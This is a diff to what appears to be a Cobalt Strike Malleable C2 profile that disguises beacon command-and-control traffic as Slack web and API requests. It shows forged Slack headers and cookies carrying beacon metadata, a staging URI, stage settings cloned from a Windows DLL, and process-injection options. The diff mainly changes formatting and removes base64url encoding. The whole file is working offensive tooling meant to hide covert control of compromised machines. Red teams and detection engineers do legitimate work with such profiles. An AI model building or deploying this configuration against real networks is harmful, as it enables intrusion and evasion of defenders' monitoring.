@@ -31,47 +31,39 @@ http-get {
     
     client {
 
-#        header "Host" "msdevchat.slack.com";
-	header "Accept" "*/*";
-	header "Accept-Language" "en-US";
-	header "Connection" "close";
-	
-        
-        metadata {
-            base64url;
-            
-	    append ";_ga=GA1.2.875";
-	    append ";__ar_v4=%8867UMDGS643";
-	    prepend "d=";
-#	    prepend "cvo_sid1=R456BNMD64;";
-	    prepend "_ga=GA1.2.875;";
-	    prepend "b=.12vPkW22o;";
-	    header "Cookie";
+#       header "Host" "msdevchat.slack.com";
+        header "Accept" "*/*";
+        header "Accept-Language" "en-US";
+        header "Connection" "close";
 
+
+        metadata {
+            append ";_ga=GA1.2.875";
+            append ";__ar_v4=%8867UMDGS643";
+            prepend "d=";
+    	#    prepend "cvo_sid1=R456BNMD64;";
+            prepend "_ga=GA1.2.875;";
+            prepend "b=.12vPkW22o;";
+            header "Cookie";
         }
 
     }
 
     server {
-
-	header "Content-Type" "text/html; charset=utf-8";
-	header "Connection" "close";
-	header "Server" "Apache";
-	header "X-XSS-Protection" "0";
-	header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
-	header "Referrer-Policy" "no-referrer";
-	header "X-Slack-Backend" "h";
-	header "Pragma" "no-cache";
-	header "Cache-Control" "private, no-cache, no-store, must-revalidate";
-	header "X-Frame-Options" "SAMEORIGIN";
-	header "Vary" "Accept-Encoding";
-	header "X-Via" "haproxy-www-w6k7";
-        
+        header "Content-Type" "text/html; charset=utf-8";
+        header "Connection" "close";
+        header "Server" "Apache";
+        header "X-XSS-Protection" "0";
+        header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
+        header "Referrer-Policy" "no-referrer";
+        header "X-Slack-Backend" "h";
+        header "Pragma" "no-cache";
+        header "Cache-Control" "private, no-cache, no-store, must-revalidate";
+        header "X-Frame-Options" "SAMEORIGIN";
+        header "Vary" "Accept-Encoding";
+        header "X-Via" "haproxy-www-w6k7";
 
         output {
-
-            base64url;
-
             prepend "<!DOCTYPE html>";
             prepend "<html lang=\"en-US\" class=\"supports_custom_scrollbar\">";
             prepend "<head>";
@@ -97,68 +89,60 @@ http-get {
             append "<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.closeNagAndSetCookie()\">Never ask again on this computer</button>";
             append "</span>";
             append "</div>";
-
             print;
         }
     }
 }
 
 http-post {
-    
+
     set uri "/api/api.test";
 
     client {
 
 #	header "Host" "msdevchat.slack.com";
 	header "Accept" "*/*";
-	header "Accept-Language" "en-US";     
-        
+	header "Accept-Language" "en-US";
+
         output {
-            base64url;
-	    
-	    append ";_ga=GA1.2.875";
-	    append "__ar_v4=%8867UMDGS643";
-	    prepend "d=";
-#	    prepend "cvo_sid1=R456BNMD64;";
-	    prepend "_ga=GA1.2.875;";
-	    prepend "b=.12vPkW22o;";
-	    header "Cookie";
-
-
+        	append ";_ga=GA1.2.875";
+            append "__ar_v4=%8867UMDGS643";
+            prepend "d=";
+    #	    prepend "cvo_sid1=R456BNMD64;";
+            prepend "_ga=GA1.2.875;";
+            prepend "b=.12vPkW22o;";
+            header "Cookie";
+            print;
         }
 
 
         id {
 #not sure on this, just trying to blend it in.
-            base64url;
-	    prepend "GA1.";
-	    header "_ga";
-
+            prepend "GA1.";
+            header "_ga";
         }
     }
 
     server {
 
-	header "Content-Type" "application/json; charset=utf-8";
-	header "Connection" "close";
-	header "Server" "Apache";
-	header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
-	header "Referrer-Policy" "no-referrer";
-	header "X-Content-Type-Options" "nosniff";
-	header "X-Slack-Req-Id" "6319165c-f976-4d0666532";
-	header "X-XSS-Protection" "0";
-	header "X-Slack-Backend" "h";
-	header "Vary" "Accept-Encoding";
-	header "Access-Control-Allow-Origin" "*";
-	header "X-Via" "haproxy-www-6g1x";
-        
+        header "Content-Type" "application/json; charset=utf-8";
+        header "Connection" "close";
+        header "Server" "Apache";
+        header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
+        header "Referrer-Policy" "no-referrer";
+        header "X-Content-Type-Options" "nosniff";
+        header "X-Slack-Req-Id" "6319165c-f976-4d0666532";
+        header "X-XSS-Protection" "0";
+        header "X-Slack-Backend" "h";
+        header "Vary" "Accept-Encoding";
+        header "Access-Control-Allow-Origin" "*";
+        header "X-Via" "haproxy-www-6g1x";
+
 
         output {
             base64;
-
-	        prepend "{\"ok\":true,\"args\":{\"user_id\":\"LUMK4GB8C\",\"team_id\":\"T0527B0J3\",\"version_ts\":\"";
+        	prepend "{\"ok\":true,\"args\":{\"user_id\":\"LUMK4GB8C\",\"team_id\":\"T0527B0J3\",\"version_ts\":\"";
 	        append "\"},\"warning\":\"superfluous_charset\",\"response_metadata\":{\"warnings\":[\"superfluous_charset\"]}}";
-
             print;
         }
     }
@@ -170,26 +154,26 @@ http-stager {
     set uri_x64 "/messages/DALBNSF25";
 
     client {
-	header "Accept" "*/*";
-	header "Accept-Language" "en-US,en;q=0.5";
-	header "Accept-Encoding" "gzip, deflate";
-	header "Connection" "close";
+        header "Accept" "*/*";
+        header "Accept-Language" "en-US,en;q=0.5";
+        header "Accept-Encoding" "gzip, deflate";
+        header "Connection" "close";
     }
 
     server {
-	header "Content-Type" "text/html; charset=utf-8";        
+        header "Content-Type" "text/html; charset=utf-8";
         header "Connection" "close";
-	header "Server" "Apache";
-	header "X-XSS-Protection" "0";
-	header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
-	header "Referrer-Policy" "no-referrer";
-	header "X-Slack-Backend" "h";
-	header "Pragma" "no-cache";
-	header "Cache-Control" "private, no-cache, no-store, must-revalidate";
-	header "X-Frame-Options" "SAMEORIGIN";
-	header "Vary" "Accept-Encoding";
-	header "X-Via" "haproxy-www-suhx";
-    
+        header "Server" "Apache";
+        header "X-XSS-Protection" "0";
+        header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
+        header "Referrer-Policy" "no-referrer";
+        header "X-Slack-Backend" "h";
+        header "Pragma" "no-cache";
+        header "Cache-Control" "private, no-cache, no-store, must-revalidate";
+        header "X-Frame-Options" "SAMEORIGIN";
+        header "Vary" "Accept-Encoding";
+        header "X-Via" "haproxy-www-suhx";
+
     }
 
 
@@ -210,7 +194,7 @@ post-ex {
 
 }
 
-#used peclone on wwanmm.dll. 
+#used peclone on wwanmm.dll.
 #don't use 'set image_size_xx' if using 'set module_xx'
 stage {
 	set checksum       "0";
@@ -247,14 +231,14 @@ stage {
 }
 process-inject {
 
-    set allocator "NtMapViewOfSection";		
+    set allocator "NtMapViewOfSection";
 
     set min_alloc "16700";
 
-    set userwx "false";  
-    
+    set userwx "false";
+
     set startrwx "true";
-        
+
     transform-x86 {
         prepend "\x90\x90\x90";
     }
